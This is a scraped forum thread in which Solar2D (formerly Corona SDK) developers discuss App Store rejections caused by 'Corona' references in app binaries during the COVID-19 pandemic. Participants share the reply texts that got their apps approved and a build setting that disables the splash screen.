          <p>Hi all need help, my app just a simple timer countdown app nothing related with covid-19. Did anyone know how to solve this issue? Thanks for your time</p>
<h3>Guideline 2.1 - Information Needed</h3>
<p>We have started the review of your app, but we are not able to continue because we need additional information about the functionality and services in your app related to the COVID-19 pandemic.</p>
<p><strong>Next Steps</strong></p>
<p>To help us proceed with the review of your app, please provide detailed responses to the following questions. The more information you can provide at this time, the sooner we can complete your review.</p>
<p>-Your app contains Covid-19 or related references in the .plist or in your binary, to what purpose does your app reference said subjects?<br>
-What are the steps needed to locate those references within your binary?</p>
<p>Once you reply to this message in Resolution Center with the requested information, we can proceed with your review.</p>
        </div>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">
          <meta itemprop="keywords" content="">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p>Assuming you are using old builds. Download the latest build (2020.3582) and the issue should go away. <a href="https://developer.coronalabs.com/downloads/coronasdk" rel="nofollow noopener">https://developer.coronalabs.com/downloads/coronasdk</a></p>
<p>In the build settings add this splash control. It is free now.</p>
<pre><code>splashScreen =
    {
        ios = {
            enable = false
        },
        android = {
            enable = false
        }
    },</code></pre>
        </div>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>for your info I’m using latest build corona sdk 3582</p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>Other developers faced this issue. As far as I know, they solved it by replying to that message and telling them about the engine and the transition to Solar2D. I remember <a href="https://forums.solar2d.com/u/grahamranson1">@GrahamRanson1</a> solving this. Maybe he could help.</p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.solar2d.com/u/vlads"><span itemprop="name">vlads</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-05-27T14:57:49Z">
                May 27, 2020,  2:57pm
              </time>
              <meta itemprop="dateModified" content="2020-05-27T14:57:49Z">
          <span itemprop="position">#5</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>You can reply something like</p>
<blockquote>
<p>My game is using Corona Game Engine. It is 10 years in business of delivering games to Apple App Store. It is unrelated to COVID-19 or coronaviruses. It is also registered trademark of the Corona Labs.</p>
<p>Corona is a common word, which has meanings outside of the pandemic. Like <span>#3</span> game engine by games on mobile devices.</p>
</blockquote>
        </div>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p>In case anybody still has problems with App Store rejection due to Corona references in the meta data, I just ran into that problem when submitting an update for Ice Trap that was rejected because:</p>
<blockquote>
<ul>
<li>Your app contains Corona references in the info_plist and other files in your binary, to what purpose does your app reference said subjects?</li>
<li>What are the steps needed to locate those references within your binary?</li>
</ul>
</blockquote>
<p>I replied the following and Apple was ok with it, and the update is now ready for sale:</p>
<blockquote>
<p>The reason for “Corona references” in the plist file is because the game itself is built using the Corona 2D game engine which has existed for probably at least 10 years. See <a href="https://coronalabs.com/" rel="nofollow noopener">https://coronalabs.com</a>.</p>
<p>Since the Corona pandemic started, a rebranding of the Corona game engine has taken place and it is now known as Solar2D, see <a href="https://solar2d.com/" rel="nofollow noopener">https://solar2d.com/</a>.</p>
<p>However, a lot of the internal libraries and plugins used by the engine still contain the Corona name and/or the <a href="http://coronalabs.com/" rel="nofollow noopener">coronalabs.com</a> domain name. This is nothing that is ever exposed to the end users and there are definitely no connections or references to the Covid-19 virus, just a very unfortunate name collision.</p>
<p>Hope you have understanding, as there is nothing I can do to change that.</p>
</blockquote>
        </div>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>I replied with something similar as above and it was approved in an hour.</p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.solar2d.com/u/awara"><span itemprop="name">awara</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-05-29T08:59:17Z">
                May 29, 2020,  8:59am
              </time>
              <meta itemprop="dateModified" content="2020-05-29T08:59:17Z">
          <span itemprop="position">#8</span>
          </span>
        </p></div>
        <p>Hi!, yesterday one update of an existing app was rejected, I replied with your message <a href="https://forums.solar2d.com/u/markus_ranner">@Markus_Ranner</a> and now I’m still waiting for review… <img src="https://forums.solar2d.com/images/emoji/apple/pensive.png?v=9" title=":pensive:" alt=":pensive:"></p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.solar2d.com/u/awara"><span itemprop="name">awara</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-06-08T13:02:45Z">
                June 8, 2020,  1:02pm
              </time>
              <meta itemprop="dateModified" content="2020-06-08T13:02:45Z">
          <span itemprop="position">#9</span>
          </span>
        </p></div>
        <p>Sorry for my delay, the app was approved a few hours later of my last message. Yesterday send a new app and was approved the same day!</p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>






    </div></div>]]>
            </description>
            <link>https://forums.solar2d.com/t/rejected-on-appstore-contains-covid-19-or-related-references-in-the-plist-or-in-your-binary/351405</link>
            <guid isPermaLink="false">hacker-news-small-sites-25770366</guid>
            <pubDate>Thu, 14 Jan 2021 01:04:46 GMT</pubDate>
        </item>
    </channel>
</rss>
